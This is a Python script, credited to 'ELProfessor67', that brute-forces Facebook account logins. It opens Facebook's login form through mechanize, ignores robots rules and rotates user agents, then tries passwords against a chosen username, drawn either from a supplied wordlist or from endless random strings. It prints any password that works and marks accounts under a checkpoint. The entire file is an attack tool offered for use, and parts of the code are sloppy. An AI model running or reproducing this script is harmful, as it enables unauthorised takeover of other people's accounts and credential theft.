import random
import os
import sys
import time
import requests

#checking internet connection
try:
	requests.get("https://www.google.com", timeout=5)
except (requests.ConnectionError, requests.Timeout) as exception:
	print("Check Your Internet Connection")
	sys.exit()

#checking module install or not
try: 
  import mechanize
except ModuleNotFoundError:
  print("mechanize install")
  os.system("pip install mechanize -y")

## COLORS 
wi="\033[1;37m" #White#
rd="\033[1;31m" #Red   #
gr="\033[1;32m" #Green #
yl="\033[1;33m" #Yellow#

os.system("clear"or"cls")

print(85*"_",end="")
print("""
\n
  ____             _       
 | __ ) _ __ _   _| |_ ___ 
 |  _ \| '__| | | | __/ _ \
 | |_) | |  | |_| | ||  __/
 |____/|_|   \__,_|\__\___|
                           
""")

print(85*"_",end="")
print("\n\n\t\t\t\t Author : ELProfessor67")
## send request
User_agents = [
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
  'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
  'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']

#some important method
br = mechanize.Browser()
br.set_handle_robots(False)
br._factory.is_html = True
br.addheaders = [('User-agent',random.choice(User_agents))]

#login function
def login(username,password):
  br.open("https://www.facebook.com")
  br.select_form(nr=0)
  br.form["email"] = username
  br.form["pass"] = password
  br.method = "POST"
  res = br.submit().get_data().__contains__(b"home_icon")
  if res:
    return 1
  elif "checkpoint" in br.geturl():
    return 2
  else:
    return 0

#start brute force benner function
def banner():
  os.system("clear"or"cls")
  print(85*"_",end="\n\n\n")
  print(f"\t\t\t\t{gr} Created By ELProfessor67\n")
  print(85*"_",end="\n\n")
  print(f"\t\t\t\t{rd} Starting Brute Force...\n\n")
  
#username checking 
username =input("\nEnter your username : ")
while True:
  if not username:
    print("username can't be empty")
    username =input("Enter your username : ")
  else:
    break

have_pl = input("you have password list[y/n]? ").lower()

if have_pl == "y" or have_pl == "yes":
  #file_path checkpoint  
  file_path = input("\nEnter your password file path : ")
  while True:
    if not file_path:
      print("file path can't be empty")
      file_path =input("Enter your file password path : ")
    else:
      break
#checking file exists or not
  try:
    pw = open(file_path,"r")
    password = pw.read().splitlines()
  except FileNotFoundError:
    print("{file_path} this file not exist please check path")
    sys.exit()
  
  banner()
#start guessing
  for pas in password:
    get_res = login(username,pas)
    if get_res:
      print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl} {pas} {wi}] ==> {gr} Successful")
      print(f"{wi}Username = {gr}{username}")
      print(f"{wi}password = {gr}{pas}")
      break
      sys.exit()
    elif get_res == 2:
      print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl}{pas}{wi}] {gr} ==> {wi} Successful")
      print(f"{wi}Username = {gr}{username}")
      print(f"{wi}password = {gr}{pas}")
      print(f"{rd}warning {wi}this account use 2F Authentication")
      break
      sys.exit()
    else:
      print(f"{wi}[{rd}-{wi}]{rd} Trying Login {wi}[{yl} {pas} {wi}] ==> {rd} failed")
else:
#start guessing with python password
  AtoZ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  atoz = AtoZ.lower()
  digits = "1234567890"
  special_car = "@#£_&-+()/*\"':;!?{}[]|~`=$"
  all_alp = AtoZ+atoz+digits+special_car
  pas_len = [6,7,8,9,10,11,12,13,14,15]
  banner()
  while True:
    pas = "".join(random.sample(all_alp,random.choice(pas_len)))
    get_res = login(username,str(pas))
    if get_res:
      print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl} {pas} {wi}] ==> {gr} Successful")
      print(f"{wi}Username = {gr}{username}")
      print(f"{wi}password = {gr}{pas}")
      break
      sys.exit()
    elif get_res == 2:
      print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl}{pas}{wi}] {gr} ==> {wi} Successful")
      print(f"{wi}Username = {gr}{username}")
      print(f"{wi}password = {gr}{pas}")
      print(f"{rd}warning {wi}this account use 2F Authentication")
      break
      sys.exit()
    else:
      print(f"{wi}[{rd}-{wi}]{rd} Trying Login {wi}[{yl} {pas} {wi}] ==> {rd} failed")
  